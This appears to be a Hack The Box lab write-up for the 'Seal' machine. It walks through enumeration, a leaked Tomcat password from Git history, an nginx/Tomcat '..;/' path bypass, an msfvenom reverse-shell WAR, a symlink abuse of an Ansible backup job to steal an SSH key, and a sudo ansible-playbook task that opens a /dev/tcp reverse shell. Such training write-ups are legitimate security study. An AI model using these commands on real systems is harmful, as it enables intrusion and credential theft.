---
title: "[HTB] Machine: Seal"
description: "[HTB] Machine: Seal"
date: 2023-11-02
menu:
  sidebar:
    name: "[HTB] Machine: Seal"
    identifier: htb-machine-Seal
    parent: htb-machines-linux
    weight: 10
hero: images/seal.png
tags: ["HTB", "wfuzz", "vhosts", "nginx", "tomcat", "git-bucket", "off-by-slash", "git", "mutual-authentication", "uri-parsing", "war", "msfvenom", "ansible"]
---

# Seal
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.250 --min-rate 1000            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 14:34 GMT
Warning: 10.10.10.250 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.250 (10.10.10.250)
Host is up (0.21s latency).
Not shown: 63375 closed tcp ports (conn-refused), 2157 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 148.11 seconds
```
```
└─$ nmap -Pn -p22,443,8080 -sC -sV 10.10.10.250 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 14:37 GMT
Nmap scan report for 10.10.10.250 (10.10.10.250)
Host is up (0.21s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 05 Nov 2023 14:37:06 GMT
|     Set-Cookie: JSESSIONID=node01prvvo51qscyy1975l0bkow4cs2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 05 Nov 2023 14:37:03 GMT
|     Set-Cookie: JSESSIONID=node0gnhde3itepwijm5ouse0ca1b0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 05 Nov 2023 14:37:04 GMT
|     Set-Cookie: JSESSIONID=node0157tuo2326c40miepxt8u3qz51.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=11/5%Time=6547A8C3%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sun,\x2005\x2
SF:0Nov\x202023\x2014:37:03\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0gnhde
SF:3itepwijm5ouse0ca1b0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,
SF:\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"HTTP
SF:/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2005\x20Nov\x202023\x2014:37:04\x2
SF:0GMT\r\nSet-Cookie:\x20JSESSIONID=node0157tuo2326c40miepxt8u3qz51\.node
SF:0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x200
SF:0:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x2
SF:0GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,
SF:AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version<
SF:/pre>")%r(FourOhFourRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDat
SF:e:\x20Sun,\x2005\x20Nov\x202023\x2014:37:06\x20GMT\r\nSet-Cookie:\x20JS
SF:ESSIONID=node01prvvo51qscyy1975l0bkow4cs2\.node0;\x20Path=/;\x20HttpOnl
SF:y\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConten
SF:t-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(
SF:Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCont
SF:ent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nC
SF:onnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x
SF:20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.82 seconds
```

- Web Server

![](./images/1.png)

- `vhosts`
```
└─$ wfuzz -u https://10.10.10.250/ -H 'Host: FUZZ.seal.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 1140
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.250/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000689:   400        16 L     122 W      2250 Ch     "gc._msdcs"
000009532:   400        14 L     100 W      1949 Ch     "#www"
000010581:   400        14 L     100 W      1949 Ch     "#mail" 
```

- `gobuster`
  - `/manager` indicates `tomcat`
```
└─$ gobuster dir -u https://seal.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error -k

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://seal.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,js,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 19737]
/images               (Status: 302) [Size: 0] [--> http://seal.htb/images/]
/admin                (Status: 302) [Size: 0] [--> http://seal.htb/admin/]
/icon                 (Status: 302) [Size: 0] [--> http://seal.htb/icon/]
/css                  (Status: 302) [Size: 0] [--> http://seal.htb/css/]
/js                   (Status: 302) [Size: 0] [--> http://seal.htb/js/]
/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]

```

- Port `8080`
  - Register a user and enumerate

![](./images/2.png)

![](./images/3.png)

## Foothold
- Inside `seal_market` repo we have a `tomcat` folder with configs
  - But none of them reveals anything
  - Yet we have history of commits

![](./images/4.png)

- Found creds
  - `tomcat:42MrHBf*z8{Z%`

![](./images/5.png)

- But we can't access `/manager` due to `nginx`  mutual authentication check configurations
```
<SNIP>
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
 
	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
#               try_files $uri $uri/ =404;
        }
<SNIP>
```

- If we google for `NGINX and Tomcat misconfigurations`, we will eventually hit a [post](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) which discusses the possible attack path 
  - https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
  - So `Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is`
  - So if we send visit `https://seal.htb/manager..;/html`, then `nginx` will interpret it as it is and redirect it to `tomcat`
    - `tomcat` will normalize it and interpret it as `https://seal.htb/manager/html`
  - But the `post` has different variations, the one that worked for me was `https://seal.htb/manager/test/..;/html`

![](./images/6.png)

![](./images/7.png)

- Let's create `war` file
```
└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.4 lport=6666 -f war -o rev.war
Payload size: 13302 bytes
Final size of war file: 13302 bytes
Saved as: rev.war
```

- Select `war` file in `Deploy` section and click `deploy`
  - You might receive `403`, so we have to intercept the request and change a path

![](./images/8.png)

![](./images/10.png)

- Modify path after clicking `deploy`
  - And we see our application


![](./images/9.png)

![](./images/11.png)

- Visit our malicious application and receive reverse shell

![](./images/12.png)

## User
- We have a user `luis`
```
tomcat@seal:/var/lib/tomcat9$ ls -lha /home/luis/
total 51M
drwxr-xr-x 9 luis luis 4.0K May  7  2021 .
drwxr-xr-x 3 root root 4.0K May  5  2021 ..
drwxrwxr-x 3 luis luis 4.0K May  7  2021 .ansible
lrwxrwxrwx 1 luis luis    9 May  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis  220 May  5  2021 .bash_logout
-rw-r--r-- 1 luis luis 3.8K May  5  2021 .bashrc
drwxr-xr-x 3 luis luis 4.0K May  7  2021 .cache
drwxrwxr-x 3 luis luis 4.0K May  5  2021 .config
drwxrwxr-x 6 luis luis 4.0K Nov  5 14:24 .gitbucket
-rw-r--r-- 1 luis luis  51M Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis 4.0K May  5  2021 .java
drwxrwxr-x 3 luis luis 4.0K May  5  2021 .local
-rw-r--r-- 1 luis luis  807 May  5  2021 .profile
drwx------ 2 luis luis 4.0K May  7  2021 .ssh
-r-------- 1 luis luis   33 Nov  5 14:24 user.txt
```

- We have a non-empty `/opt`
  - Looks like `ansible-playbooks` which are owned by `luis` 

```
tomcat@seal:/var/lib/tomcat9$ ls /opt/backups/
archives  playbook
tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/
total 16K
drwxr-xr-x 4 luis luis 4.0K Nov  5 16:02 .
drwxr-xr-x 3 root root 4.0K May  7  2021 ..
drwxrwxr-x 2 luis luis 4.0K Nov  5 16:02 archives
drwxrwxr-x 2 luis luis 4.0K May  7  2021 playbook

```

- It copies files from `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` to `/opt/backups/files` with `copy_links=yes`
  - Then it archives them
  - Then it deletes `/opt/backups/files`
```
tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/playbook/
total 12K
drwxrwxr-x 2 luis luis 4.0K May  7  2021 .
drwxr-xr-x 4 luis luis 4.0K Nov  5 16:06 ..
-rw-rw-r-- 1 luis luis  403 May  7  2021 run.yml
tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

- Looks like it's running every minute
```
tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/archives
total 2.4M
drwxrwxr-x 2 luis luis 4.0K Nov  5 16:08 .
drwxr-xr-x 4 luis luis 4.0K Nov  5 16:08 ..
-rw-rw-r-- 1 luis luis 592K Nov  5 16:05 backup-2023-11-05-16:05:32.gz
-rw-rw-r-- 1 luis luis 592K Nov  5 16:06 backup-2023-11-05-16:06:32.gz
-rw-rw-r-- 1 luis luis 592K Nov  5 16:07 backup-2023-11-05-16:07:32.gz
-rw-rw-r-- 1 luis luis 592K Nov  5 16:08 backup-2023-11-05-16:08:32.gz
```

- Since it copies with `copy_links=yes`, we can check if we can create a link within `/var/lib/tomcat9/webapps/ROOT/admin/dashboard`
  - We can write to `uploads` folder
```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ find . -writable
./uploads
```

- Let's create a link to `luis`' home directory
  - Wait till the next execution
  - And we see a new archive with a much bigger size
```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
```
```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -lha /opt/backups/archives
total 13M
drwxrwxr-x 2 luis luis 4.0K Nov  5 16:17 .
drwxr-xr-x 5 luis luis 4.0K Nov  5 16:17 ..
-rw-rw-r-- 1 luis luis 592K Nov  5 16:15 backup-2023-11-05-16:15:32.gz
-rw-rw-r-- 1 luis luis 592K Nov  5 16:16 backup-2023-11-05-16:16:33.gz
-rw-rw-r-- 1 luis luis  12M Nov  5 16:17 backup-2023-11-05-16:17:33.gz

```

- I'll copy it to `/dev/shm` and extract files
```
tomcat@seal:/dev/shm$ tar zxf backup-2023-11-05-16\:17\:33.gz --force-local
tomcat@seal:/dev/shm$ 
```

- We can grab the ssh key and the flag
```
tomcat@seal:/dev/shm$ ls
backup-2023-11-05-16:17:33.gz  dashboard
tomcat@seal:/dev/shm$ cd dashboard/
tomcat@seal:/dev/shm/dashboard$ ls
bootstrap  css  images  index.html  scripts  uploads
tomcat@seal:/dev/shm/dashboard$ cd uploads/
tomcat@seal:/dev/shm/dashboard/uploads$ ls
luis
tomcat@seal:/dev/shm/dashboard/uploads$ cd luis/
tomcat@seal:/dev/shm/dashboard/uploads/luis$ ls -lha
total 51M
drwxr-x--- 9 tomcat tomcat  280 May  7  2021 .
drwxr-x--- 3 tomcat tomcat   60 Nov  5 16:19 ..
drwxr-x--- 3 tomcat tomcat   60 Nov  5 16:19 .ansible
-rw-r----- 1 tomcat tomcat  220 May  5  2021 .bash_logout
-rw-r----- 1 tomcat tomcat 3.8K May  5  2021 .bashrc
drwxr-x--- 3 tomcat tomcat   80 Nov  5 16:19 .cache
drwxr-x--- 3 tomcat tomcat   60 Nov  5 16:19 .config
drwxr-x--- 6 tomcat tomcat  200 Nov  5 16:19 .gitbucket
-rw-r----- 1 tomcat tomcat  51M Jan 14  2021 gitbucket.war
drwxr-x--- 3 tomcat tomcat   60 Nov  5 16:19 .java
drwxr-x--- 3 tomcat tomcat   60 Nov  5 16:19 .local
-rw-r----- 1 tomcat tomcat  807 May  5  2021 .profile
drwx------ 2 tomcat tomcat  100 Nov  5 16:19 .ssh
-r-------- 1 tomcat tomcat   33 Nov  5 14:24 user.txt
```
```
tomcat@seal:/dev/shm/dashboard/uploads/luis$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```
```
└─$ ssh luis@10.10.10.250 -i id_rsa
Warning: Permanently added '10.10.10.250' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Nov 2023 04:23:37 PM UTC

  System load:           0.01
  Usage of /:            47.1% of 9.58GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             166
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.250
  IPv6 address for eth0: dead:beef::250:56ff:feb9:eac1

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

22 updates can be applied immediately.
15 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$ 
```

## Root
- `sudo`
  - We can run `ansible-playbook` as `root`
```
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

- Let's create a playbook
```
- hosts: localhost
  tasks:
  - name: rev 
    shell: bash -c 'bash -i >& /dev/tcp/10.10.16.4/7777 0>&1'

```
```
luis@seal:/dev/shm$ sudo ansible-playbook rev.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ***************************************************************************************************************************************************************************************************************************

TASK [Gathering Facts] *********************************************************************************************************************************************************************************************************************
ok: [localhost]

TASK [rev] *********************************************************************************************************************************************************************************************************************************

```

- Check the listener
  - We receive a connection 
  - Grab the flag

![](./images/13.png)